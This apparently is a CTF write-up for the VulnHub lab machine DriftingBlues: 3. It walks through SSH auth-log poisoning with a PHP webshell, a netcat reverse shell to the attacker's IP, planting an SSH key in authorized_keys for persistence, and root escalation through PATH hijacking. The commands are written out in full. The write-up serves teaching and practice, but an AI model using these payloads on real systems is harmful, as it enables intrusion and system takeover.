---
title: "DriftingBlues: 3"
date: 07-25-2024
excerpt: VulnHub
cover: ../uploads/cover_driftingblues3.jpg
tags: ssh-log-poisoning, log-injection, webshell
---

Hey everyone, welcome back! We're diving into the third installment of the *DriftingBlues* series from VulnHub. In this write-up, I'll walk you through the complete, step-by-step breakdown of how I approached, exploited, and ultimately rooted the target machine.

---

# Reconnaissance

The first step, as always, is to run an `Nmap` scan to identify potential entry points into the target system.

```shell
nmap -A -sC -p- -T5 -oN nmap_result.log 192.168.137.102
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXH86889bZbAbrlrixf7P%252FScreenshot%2520%281533%29.png%3Falt%3Dmedia%26token%3D39ef924a-5b67-4434-b45f-cf593a40e3e6&width=768&dpr=3&quality=100&sign=3063e7e9&sv=2)

ssh and http are open

---

# Enumeration

If you look closely at the Nmap scan results, you'll see that the `robots.txt` file disallows access to `/eventadmins`. Before we explore that hidden path, let's first check out the main webpage to see what it reveals.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FK0uG1aLobSNoYEsxW5ZE%252FScreenshot%2520%281536%29.png%3Falt%3Dmedia%26token%3D937b058c-6956-4897-ba12-7ca44db89153&width=768&dpr=3&quality=100&sign=7682e73d&sv=2)

This is the main webpage

## Vulnerability Discovered: Sensitive Path Disclosed via robots.txt

And this is the `/eventadmins`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZgGfGOvvW8RTBSqhcqdy%252FScreenshot%2520%281534%29.png%3Falt%3Dmedia%26token%3Df709a9d7-5c74-4e8d-a89f-4203695d32a3&width=768&dpr=3&quality=100&sign=e27a8c6a&sv=2)

Here's another file we've discovered — let's take a look at `/littlequeenofspades.html` and see what it contains.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fz9vhbaxtaeDEtKgjJQNI%252FScreenshot%2520%281538%29.png%3Falt%3Dmedia%26token%3D7af8801b-1fe5-4bb3-b39f-dfa1c40d79c6&width=768&dpr=3&quality=100&sign=3d13e2fb&sv=2)

Nothing's useful, let's check the source code of this HTML file

## Vulnerability Discovered: Sensitive Data Hidden in HTML Source (Base64)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FadM5gmVqTUwXO8bvyKB1%252FScreenshot%2520%281539%29.png%3Falt%3Dmedia%26token%3D7d8fac22-ff86-4ba9-9f89-f092e7153ea9&width=768&dpr=3&quality=100&sign=a20b17e6&sv=2)

There you are, there's a Base64 encoded string here.

This is the plaintext

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5d60Ooo90UhhgBeKpqws%252FScreenshot%2520%281540%29.png%3Falt%3Dmedia%26token%3D3faefd5f-af1c-4d9c-acec-aa45cc1b49ac&width=768&dpr=3&quality=100&sign=59e5e9ca&sv=2)

Another Base64 encoded string.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0JV95DfYsff2rFKgWqlM%252FScreenshot%2520%281541%29.png%3Falt%3Dmedia%26token%3Df3d9f5d2-97bd-48d9-b604-25136123daf4&width=768&dpr=3&quality=100&sign=7abdf22a&sv=2)

A PHP file? I've got a good feeling about this one — let's go ahead and check it out.

## Vulnerability Discovered: Unsanitized Live Log Viewer (Precursor to Log Poisoning)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2OCEgh5MVjQlMpvevaWp%252FScreenshot%2520%281542%29.png%3Falt%3Dmedia%26token%3Dc49876ab-2916-49f8-a744-aa9b98d9bcfc&width=768&dpr=3&quality=100&sign=a0df44cd&sv=2)

Hmm, this is interesting—every time I refresh the page, the log content seems to update in real time. What really stood out to me was the presence of the "ssh auth log". That immediately raised a red flag and made me think this might be vulnerable to **SSH log poisoning**. This kind of behavior suggests that the system is displaying log files directly on the webpage, which can be a serious security flaw. If the logs aren't properly sanitized before being rendered, it opens up the possibility of injecting malicious payloads that could potentially lead to command execution or other forms of exploitation. Definitely worth digging deeper into this vector.

---

# Exploitation

## Vulnerability Discovered: SSH Auth Log Poisoning Leading to RCE

To test for a possible **SSH log poisoning vulnerability**, I attempted to inject a simple PHP web shell by using it as the SSH **username**. Since the SSH authentication process logs failed login attempts—including the username—into system log files like `/var/log/auth.log`, I crafted the following command

```shell
ssh '<?php system($_GET["command"]); ?>'@192.168.137.102
```

Even though the login fails, if the log file is later displayed on a web page without proper sanitization, the injected PHP code could be executed by the web server. This would effectively turn the exposed log viewer into a remote command execution point, allowing me to interact with the system via a browser using GET parameters.

This method hinges on two things:

1. The SSH login attempts being logged in plaintext (including the injected username).
2. The web application reading and rendering those logs *without escaping or sanitizing the content*.

If both conditions are met, it becomes a dangerous entry point for remote code execution (RCE).

But... There's a problem, this took me a long time to fix

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbCIBOGc013JE094F2pRu%252FScreenshot%2520%281544%29.png%3Falt%3Dmedia%26token%3D3fb6210b-9b53-42cc-a5ce-f89a020e34c0&width=768&dpr=3&quality=100&sign=8f360572&sv=2)

Unfortunately, the payload was rejected by SSH because it contains invalid characters. I attempted several different escaping techniques to bypass the restriction even putting the payload to a variable, but none of them were successful.

## Bypassing the SSH Client Restriction via PowerShell

I've always believed there's *always* a way in—so instead of giving up, I stuck with the same overall approach but added a twist. This time, I decided to try it using **Windows PowerShell**. I stored the payload inside a variable, just like I did earlier, and then executed the SSH command from there. I figured there's a chance that Windows might handle the payload differently and allow it through, unlike on Linux.

Guess what, it worked!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGNm42zVEBAcKIshDonvT%252FScreenshot%2520%281560%29.png%3Falt%3Dmedia%26token%3Dda1a6265-310a-407d-9da3-9ad0ab266c2e&width=768&dpr=3&quality=100&sign=7cca0e2f&sv=2)

As you can see here, it's injected!!! Now let's go back to our VM and use our webshell!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9mGMdZBxdWrdrYsa6DaS%252FScreenshot%2520%281561%29.png%3Falt%3Dmedia%26token%3Dd92b2f1a-426c-4a27-9548-a615c952ac77&width=768&dpr=3&quality=100&sign=bf6a4d23&sv=2)

And there it is—any command we pass through the `command` parameter is now successfully executed!

## Establishing a Reverse Shell

Let's see if `Netcat` is available on the system—if it is, we can quickly set up a reverse shell and gain remote access in no time.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOU7SjDA6Et0kVr8drWB1%252FScreenshot%2520%281573%29.png%3Falt%3Dmedia%26token%3Da3df33e5-967d-47af-b2e3-bf04f7dd32e6&width=768&dpr=3&quality=100&sign=98a55208&sv=2)

And there is!! Time for reverse shell!

Let's setup our listener first

```shell
nc -lnvp 1234
```

And in our webshell, execute this command

```shell
nc 192.168.137.246 1234 -e /bin/bash
```

And here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGoTLwVpVOpo8UkIvog5o%252FScreenshot%2520%281574%29.png%3Falt%3Dmedia%26token%3D171b85d9-e783-45f9-ba99-d61859e10035&width=768&dpr=3&quality=100&sign=a80d35af&sv=2)

There it is—we've got a shell! To make our access more stable and interactive, we'll upgrade it using Python's `pty` module.

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

and use xterm as TERM env

```shell
export TERM=xterm
```

---

# Privilege Escalation (www-data → robertj)

Upon exploring, there's one user in this machine named `robertj`.

These are the files that `robertj` contains

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbzeKrBE8Di45zv2bxgN9%252FScreenshot%2520%281578%29.png%3Falt%3Dmedia%26token%3D6b14f62d-5afd-4ca4-a2f9-335051e874ea&width=768&dpr=3&quality=100&sign=929b1dcc&sv=2)

As expected, only the user robertj has permission to access the `user.txt` file. However, I noticed a `.ssh` directory—could there be a private key inside, similar to what we found in *DriftingBlues: 2*? Let's investigate and find out.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FNMclF0R1GrnBFXI8I8uW%252FScreenshot%2520%281579%29.png%3Falt%3Dmedia%26token%3D59789297-5dc8-4772-88aa-e88e1db4d2cd&width=768&dpr=3&quality=100&sign=b518ffcc&sv=2)

Sadly, there's no files here.

## Vulnerability Discovered: Writable .ssh Directory Allows Key-Based Persistence

Seeing that there's a `.ssh` directory present, I figured I could leverage it to gain persistent access. My plan was to create an `authorized_keys` file inside that directory and add my own public key to it.

To do this, I generated an SSH key pair on my attacker machine using `ssh-keygen`. Once the key pair was created, I copied the **public key** and placed it inside the `authorized_keys` file on the target, under `~robertj/.ssh/authorized_keys`.

By doing this, I essentially authorized my attacker machine to log in as **robertj** without needing their password. I could then use my **private key** to SSH into the machine as that user—securely and without triggering password-based authentication. This is a classic persistence and privilege move when `.ssh` write access is available.

After generating the key pair, I navigated to my `.ssh` directory and found two files: `id_rsa` and `id_rsa.pub`. The one with the `.pub` extension is the **public key**—that's the one we'll be using for this step.

Once the public key is copied, we'll create an `authorized_keys` file on the target machine and paste our public key into it.

```shell
echo 'public_key' > authorized_keys
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFSYwtrk9weY0HZVaSDKA%252FScreenshot%2520%281580%29.png%3Falt%3Dmedia%26token%3D8ac346dd-8396-44f5-98a6-b6fb62645929&width=768&dpr=3&quality=100&sign=bac2c50f&sv=2)

After that we will login as `robertj` using our private key

```shell
ssh robertj@192.168.137.102 -i id_rsa
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1Ww248N9DYLKzFiz3Y1P%252FScreenshot%2520%281585%29.png%3Falt%3Dmedia%26token%3De5e2dc98-ca37-437a-a728-1a72fc23c17d&width=768&dpr=3&quality=100&sign=b99d9aff&sv=2)

We're now robertj

It works!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfyhMWscLQ5AzklPgmk27%252FScreenshot%2520%281588%29.png%3Falt%3Dmedia%26token%3D918cda0a-df07-400a-8f90-cf9a2b359bea&width=768&dpr=3&quality=100&sign=8083186f&sv=2)

**First flag!!**

---

# Privilege Escalation (robertj → root)

Now, it's time to get into root. The first thing I did is to use sudo -l to see if there's a tool or command that robertj can execute without elevated privileges.

But...

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVQ1Ud0WosgoSNcx5KVfr%252FScreenshot%2520%281590%29.png%3Falt%3Dmedia%26token%3D2f68da67-cfed-4989-960c-9971570ecaf2&width=768&dpr=3&quality=100&sign=9394627c&sv=2)

Unfortunately, the `sudo` command isn't available on this machine—definitely not ideal. That leaves me with one solid option: running **linPEAS** to perform a thorough privilege escalation scan.

## Vulnerability Discovered: Custom Root-Owned Binary Vulnerable to PATH Hijacking

Upon analyzing the results of linPEAS, I noticed something

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9S2rVP2ovTObrmrvkztr%252FScreenshot%2520%281598%29.png%3Falt%3Dmedia%26token%3D0777f4ee-b823-4966-8c4c-db36cd484536&width=768&dpr=3&quality=100&sign=c4be1a38&sv=2)

I came across a command called `getinfo` located in `/usr/bin`, and interestingly, it's owned by root. What's odd is that `getinfo` isn't a standard or built-in command in Linux, which makes it immediately suspicious.

So I execute it and this is the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F66gdfoMmY2kv1PvszyEr%252FScreenshot%2520%281599%29.png%3Falt%3Dmedia%26token%3D97eefa6a-5cd2-4759-a97a-5958186d4bd8&width=768&dpr=3&quality=100&sign=3c39836d&sv=2)

Did you notice something unusual? The commands used by this tool appear to be automated. For instance, the "IP address" output seems to be retrieved using the standard Linux `ip address` command. The "hosts" section is likely just reading from the `/etc/hosts` file, and the "OS info" is probably pulled using the `uname` command. Everything looks like it's wrapped in a script that runs common system commands behind the scenes.

## Exploiting the PATH Hijack

Since the tool relies on executing system commands, we can take advantage of that by creating a fake `uname` binary containing a malicious payload to hijack its execution. Here's how to do it: first, navigate to the `/tmp` directory and create a file named `uname` with a simple bash shell payload

```shell
echo '/bin/bash' > uname
```

Then, make the file executable by setting its permissions

```shell
chmod 777 uname
```

Next, we update the `PATH` variable to prioritize `/tmp/` by running

```shell
export PATH=/tmp/:$PATH
```

This way, when the tool tries to run `uname`, it will execute our fake version in `/tmp/` instead of the real system binary, effectively giving us a shell.

Now let's run `getinfo` to see if we will turn to root

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FK3wfp1B2NiV4mSrPyrcq%252FScreenshot%2520%281608%29.png%3Falt%3Dmedia%26token%3D2b348ed1-0666-4391-b658-4e290ae97cd8&width=768&dpr=3&quality=100&sign=24b32ccb&sv=2)

It works!!! We're now root!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJu6NEB222E117luCD5VD%252FScreenshot%2520%281611%29.png%3Falt%3Dmedia%26token%3D043b3b3f-c22d-47cb-82af-b7f0dedbdf8d&width=768&dpr=3&quality=100&sign=767a024b&sv=2)

**Second Flag!**


